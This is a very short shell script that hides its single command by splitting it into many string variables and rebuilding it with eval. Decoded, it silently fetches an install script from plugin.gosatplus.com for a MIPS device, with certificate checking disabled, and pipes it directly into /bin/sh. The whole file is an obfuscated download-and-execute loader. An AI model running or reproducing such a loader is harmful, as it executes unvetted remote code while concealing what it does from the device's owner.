z="
";Rz='R2/B';Vz='-ins';Qz='gin/';Mz='osat';Tz='ps-b';Oz='.com';Yz='h -O';Hz='ate"';az=' /bi';Xz='er.s';bz='n/sh';Uz='h-r2';Jz='p://';Wz='tall';Ez='eck-';Kz='plug';Pz='/Plu';Az='wget';Iz=' htt';Sz='H/mi';Lz='in.g';Nz='plus';Zz=' - |';Dz='o-ch';Gz='ific';Bz=' -q ';Fz='cert';Cz='"--n';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz"